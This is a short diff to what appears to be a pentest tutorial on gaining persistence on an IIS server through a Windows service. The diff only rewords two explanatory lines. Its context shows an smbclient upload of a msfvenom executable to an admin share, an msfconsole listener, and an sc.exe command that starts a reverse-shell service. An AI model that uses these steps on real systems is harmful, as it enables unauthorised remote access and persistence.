@@ -67,7 +67,7 @@ $smbclient -c "put <service_exec_name>.exe" -U admin -W xxx '//iis.test.com/admi
 
 > Replace `service_exec_name>.exe` with the name of the executable file created with msfvenom
 
-_Start the msfconsole listener:_
+_Start the msfconsole listener (used to catch the shell in one of the later step):_
 
 {% code title="Attacker" overflow="wrap" %}
 ```sh
@@ -124,7 +124,7 @@ PS> sc.exe \\iis.test.com start rvshell
 ```
 {% endcode %}
 
-Now, everytime the _IIS_ server startups, we will retrieve a reverse shell connection from the `msfconsole` session established earlier:
+Now, when the _IIS_ server startups, we will retrieve a reverse shell connection from the `msfconsole` session established earlier:
 
 {% code title="iis.test.com (admin)" %}
 ```
